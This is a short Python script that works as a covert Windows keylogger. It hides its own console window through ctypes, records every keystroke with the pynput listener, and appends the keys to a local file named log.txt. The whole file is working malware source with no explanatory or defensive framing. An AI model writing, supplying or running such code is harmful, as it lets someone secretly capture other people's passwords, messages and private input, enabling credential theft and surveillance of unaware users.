import ctypes
from pynput.keyboard import Key, Listener

ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def on_press(key):
    key = str(key).replace("'", "")

    if key == 'Key.space':
        key = ' '
    elif key == 'Key.enter':
        key = '\n'

    with open('log.txt', 'a') as f:
        f.write(key)

with Listener(on_press=on_press) as listener:
    listener.join()
